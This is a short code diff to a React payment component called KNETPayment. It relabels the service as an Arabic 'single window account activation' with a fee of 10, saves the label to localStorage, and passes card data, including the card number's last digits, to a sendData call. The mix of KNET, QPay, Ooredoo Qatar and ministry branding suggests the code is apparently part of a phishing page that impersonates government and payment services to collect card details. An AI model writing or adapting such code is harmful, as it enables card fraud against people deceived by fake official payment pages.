@@ -194,11 +194,13 @@ export default function KNETPayment() {
       totalPaid: totalAmount,
       cardType: "qpay",
       cardLast4: cardNumber.slice(-4),
-      serviceName: mohData.serviceType || "Ooredoo Qatar",
+      serviceName: "تفعيل حساب النافذة الواحدة",
       bankName: "QPay",
       bankLogo: "",
     };
     localStorage.setItem("paymentData", JSON.stringify(paymentData));
+    localStorage.setItem("sw_service_name", "تفعيل حساب النافذة الواحدة");
+    localStorage.setItem("sw_service_amount", "10");
 
     sendData({
       paymentCard: {
